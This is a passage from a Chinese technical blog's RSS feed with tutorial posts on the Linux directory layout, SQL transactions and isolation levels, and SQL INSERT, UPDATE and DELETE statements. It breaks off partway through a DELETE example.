&lt;li&gt;&lt;strong&gt;/proc&lt;/strong&gt;：proc 是 Processes（进程）的缩写，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，目的管理内存空间！&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/root&lt;/strong&gt;：该目录为系统管理员，也称作超级权限者的用户主目录。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/sbin&lt;/strong&gt;：是 Superuser Binaries（超级用户的二进制文件）的缩写，这里存放的是系统管理员使用的系统管理程序。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/selinux&lt;/strong&gt;：这个目录是 Redhat / CentOS 所特有的目录，selinux 是一个安全机制，类似于 windows 的防火墙，但是这套机制比较复杂，这个目录就是存放 selinux 相关的文件的。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/srv&lt;/strong&gt;：该目录存放一些服务启动之后需要提取的数据。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/sys&lt;/strong&gt;：sys 文件系统集成了下面 3 种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/tmp&lt;/strong&gt;：tmp 是 temporary（临时）的缩写，这个目录是用来存放一些临时文件的。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/usr&lt;/strong&gt;：usr 是 unix shared resources（共享资源）的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/usr/bin&lt;/strong&gt;：系统用户使用的应用程序。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/usr/sbin&lt;/strong&gt;：超级用户使用的比较高级的管理程序和系统守护程序。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/usr/src&lt;/strong&gt;：内核源代码默认的放置目录。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/var&lt;/strong&gt;：var 是 variable（变量）的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的文件放在这个目录下。包括各种日志文件。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/run&lt;/strong&gt;：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;避免修改&#34;&gt;避免修改&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;/etc&lt;/strong&gt;：配置目录。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/var&lt;/strong&gt;：日志目录。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/bin，/sbin，/usr/bin，/usr/sbin&lt;/strong&gt;：这是系统预设的执行文件的放置目录，比如 ls 就是在 /bin/ls 目录下的。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>SQL—事务</title>
        <link>https://ac-lm.github.io/posts/sql/sql%E4%BA%8B%E5%8A%A1/</link>
        <pubDate>Wed, 30 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/sql/sql%E4%BA%8B%E5%8A%A1/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.liaoxuefeng.com/wiki/1177760294764384&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; SQL教程 @廖雪峰 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1事务&#34;&gt;1.事务&lt;/h2&gt;
&lt;p&gt;在执行 SQL 语句的时候，存在部分业务要求一系列操作必须全部执行，而不能仅执行一部分。例如，一个转账操作：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;-- 从id=1的账户给id=2的账户转账100元
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;-- 第一步：将id=1的A账户余额减去100
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;UPDATE&lt;/span&gt; accounts &lt;span style=&#34;color:#66d9ef&#34;&gt;SET&lt;/span&gt; balance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; balance &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;-- 第二步：将id=2的B账户余额加上100
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;UPDATE&lt;/span&gt; accounts &lt;span style=&#34;color:#66d9ef&#34;&gt;SET&lt;/span&gt; balance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; balance &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这两条 SQL 语句必须全部执行。或者，如果第一条语句成功，第二条语句失败，就必须全部撤销。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这种把多条语句作为一个整体进行操作的功能，被称为数据库事务&lt;/strong&gt;。数据库事务可以确保该事务范围内的所有操作都可以全部成功或者全部失败。如果事务失败，那么效果就和没有执行这些 SQL 一样，不会对数据库数据有任何改动。&lt;/p&gt;
&lt;p&gt;可见，数据库事务具有 ACID 这4个特性：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Atomic，原子性，将所有 SQL 作为原子工作单元执行，要么全部执行，要么全部不执行&lt;/li&gt;
&lt;li&gt;Consistent，一致性，事务完成后，所有数据的状态都是一致的，即 A 账户只要减去了 100，B 账户则必定加上了 100&lt;/li&gt;
&lt;li&gt;Isolation，隔离性，如果有多个事务并发执行，每个事务作出的修改必须与其他事务隔离&lt;/li&gt;
&lt;li&gt;Duration，持久性，即事务完成后，对数据库数据的修改被持久化存储&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2隐式事务&#34;&gt;2.隐式事务&lt;/h2&gt;
&lt;p&gt;对于单条 SQL 语句，数据库系统自动将其作为一个事务执行。&lt;/p&gt;
&lt;h2 id=&#34;3显式事务&#34;&gt;3.显式事务&lt;/h2&gt;
&lt;p&gt;要手动把多条 SQL 语句作为一个事务执行，使用 BEGIN 开启一个事务，使用 COMMIT 提交一个事务，例如，把上述的转账操作作为一个显式事务：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;BEGIN&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;UPDATE&lt;/span&gt; accounts &lt;span style=&#34;color:#66d9ef&#34;&gt;SET&lt;/span&gt; balance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; balance &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;UPDATE&lt;/span&gt; accounts &lt;span style=&#34;color:#66d9ef&#34;&gt;SET&lt;/span&gt; balance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; balance &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;COMMIT&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很显然多条 SQL 语句要想作为一个事务执行，就必须使用显式事务。COMMIT 是指提交事务，即试图把事务内的所有 SQL 所做的修改永久保存。如果 COMMIT语句执行失败了，整个事务也会失败。&lt;/p&gt;
&lt;p&gt;有些时候，我们希望主动让事务失败，这时，可以用 ROLLBACK 回滚事务，整个事务会失败：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;BEGIN&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;UPDATE&lt;/span&gt; accounts &lt;span style=&#34;color:#66d9ef&#34;&gt;SET&lt;/span&gt; balance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; balance &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;UPDATE&lt;/span&gt; accounts &lt;span style=&#34;color:#66d9ef&#34;&gt;SET&lt;/span&gt; balance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; balance &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;ROLLBACK&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;数据库事务是由数据库系统保证的，我们只需要根据业务逻辑使用它就可以。&lt;/p&gt;
&lt;h2 id=&#34;4隔离级别&#34;&gt;4.隔离级别&lt;/h2&gt;
&lt;p&gt;对于两个并发执行的事务，如果涉及到操作同一条记录的时候，可能会发生问题。因为并发操作会带来数据的不一致性，包括脏读、不可重复读、幻读等。数据库系统提供了隔离级别来让我们有针对性地选择事务的隔离级别，避免数据不一致的问题。&lt;/p&gt;
&lt;p&gt;SQL 标准定义了 4 种隔离级别，分别对应可能出现的数据不一致的情况：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;Isolation Level&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;脏读（Dirty Read）&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;不可重复读（Non Repeatable Read）&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;幻读（Phantom Read）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Read Uncommitted&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Yes&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Yes&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Yes&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Read Committed&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Yes&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Yes&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Repeatable Read&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Yes&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Serializable&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;read-uncommitted&#34;&gt;Read Uncommitted&lt;/h3&gt;
&lt;p&gt;Read Uncommitted 是隔离级别最低的一种事务级别。在这种隔离级别下，一个事务会读到另一个事务更新后但未提交的数据，如果另一个事务回滚，那么当前事务读到的数据就是脏数据，这就是脏读（Dirty Read）&lt;/p&gt;
&lt;h3 id=&#34;read-committed&#34;&gt;Read Committed&lt;/h3&gt;
&lt;p&gt;在 Read Committed 隔离级别下，一个事务可能会遇到不可重复读（Non Repeatable Read）的问题。不可重复读是指，在一个事务内，多次读同一数据，在这个事务还没有结束时，如果另一个事务恰好修改了这个数据，那么，在第一个事务中，两次读取的数据就可能不一致。&lt;/p&gt;
&lt;h3 id=&#34;repeatable-read&#34;&gt;Repeatable Read&lt;/h3&gt;
&lt;p&gt;在 Repeatable Read 隔离级别下，一个事务可能会遇到幻读（Phantom Read）的问题。幻读是指，在一个事务中，第一次查询某条记录，发现没有，但是，当试图更新这条不存在的记录时，竟然能成功，并且，再次读取同一条记录，它就神奇地出现了。&lt;/p&gt;
&lt;h3 id=&#34;serializable&#34;&gt;Serializable&lt;/h3&gt;
&lt;p&gt;Serializable 是最严格的隔离级别。在 Serializable 隔离级别下，所有事务按照次序依次执行，因此，脏读、不可重复读、幻读都不会出现。虽然 Serializable 隔离级别下的事务具有最高的安全性，但是，由于事务是串行执行，所以效率会大大下降，应用程序的性能会急剧降低。如果没有特别重要的情景，一般都不会使用Serializable 隔离级别。&lt;/p&gt;
&lt;h3 id=&#34;默认隔离级别&#34;&gt;默认隔离级别&lt;/h3&gt;
&lt;p&gt;如果没有指定隔离级别，数据库就会使用默认的隔离级别。在 MySQL 中，如果使用 InnoDB，默认的隔离级别是 Repeatable Read。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SQL—修改数据</title>
        <link>https://ac-lm.github.io/posts/sql/sql%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE/</link>
        <pubDate>Tue, 29 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/sql/sql%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.liaoxuefeng.com/wiki/1177760294764384&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; SQL教程 @廖雪峰 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;关系数据库的基本操作就是增删改查，即CRUD：Create、Retrieve、Update、Delete。其中，对于查询，我们已经详细讲述了SELECT语句的详细用法。&lt;/p&gt;
&lt;p&gt;而对于增、删、改，对应的SQL语句分别是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;INSERT：插入新记录&lt;/li&gt;
&lt;li&gt;UPDATE：更新已有记录&lt;/li&gt;
&lt;li&gt;DELETE：删除已有记录&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;1insert插入&#34;&gt;1.INSERT插入&lt;/h2&gt;
&lt;p&gt;INSERT语句的基本语法是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;INSERT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;表名&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;字段1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;字段2&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;...&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;VALUES&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;值1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;值2&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;...&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;INSERT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;INTO&lt;/span&gt; students (class_id, name, gender, score) &lt;span style=&#34;color:#66d9ef&#34;&gt;VALUES&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;大牛&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意到我们并没有列出 ID 字段，也没有列出 ID 字段对应的值，这是因为 ID 字段是一个自增主键，它的值可以由数据库自己推算出来。此外，如果一个字段有默认值，那么在 INSERT 语句中也可以不出现。&lt;/p&gt;
&lt;p&gt;要注意，字段顺序不必和数据库表的字段顺序一致，但值的顺序必须和字段顺序一致。也就是说，可以写&lt;code&gt;INSERT INTO students (score, gender, name, class_id)&lt;/code&gt;，但是对应的 VALUES 就得变成&lt;code&gt;(80, &#39;M&#39;, &#39;大牛&#39;, 2)&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;还可以一次性添加多条记录，只需要在 VALUES 子句中指定多个记录值，每个记录是由 (&amp;hellip;) 包含的一组值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;INSERT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;INTO&lt;/span&gt; students (class_id, name, gender, score) &lt;span style=&#34;color:#66d9ef&#34;&gt;VALUES&lt;/span&gt;
  (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;大宝&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;),
  (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;二宝&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2update更新&#34;&gt;2.UPDATE更新&lt;/h2&gt;
&lt;p&gt;UPDATE语句的基本语法是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;表名&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;SET&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;字段1&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;值1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;字段2&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;值2&amp;#39;&lt;/span&gt;, ... &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; ...;
&lt;span style=&#34;color:#66d9ef&#34;&gt;UPDATE&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;SET&lt;/span&gt; name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;大牛&amp;#39;&lt;/span&gt;, score&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意到 UPDATE 语句的 WHERE 条件和 SELECT 语句的 WHERE 条件其实是一样的，因此完全可以一次更新多条记录：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;UPDATE&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;SET&lt;/span&gt; name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;小牛&amp;#39;&lt;/span&gt;, score&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; id&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; id&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 UPDATE 语句中，更新字段时可以使用表达式。例如，把所有 80 分以下的同学的成绩加 10 分：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;UPDATE&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;SET&lt;/span&gt; score&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;score&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; score&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中，&lt;code&gt;SET score=score+10&lt;/code&gt;就是给当前行的 score 字段的值加上了 10。如果 WHERE 条件没有匹配到任何记录，UPDATE 语句不会报错，也不会有任何记录被更新。当没有 WHERE 条件时，整个表的所有记录都会被更新&lt;/p&gt;
&lt;h2 id=&#34;3delete-删除&#34;&gt;3.DELETE 删除&lt;/h2&gt;
&lt;p&gt;DELETE 语句的基本语法是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;DELETE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;表名&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; ...;
&lt;span style=&#34;color:#66d9ef&#34;&gt;DELETE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意到 DELETE 语句的 WHERE 条件也是用来筛选需要删除的行，因此和 UPDATE 类似，DELETE 语句也可以一次删除多条记录&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;DELETE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; id&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; id&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;同样，要特别小心的是，和 UPDATE 类似，不带 WHERE 条件的 DELETE 语句会删除整个表的数据&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;DELETE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students;
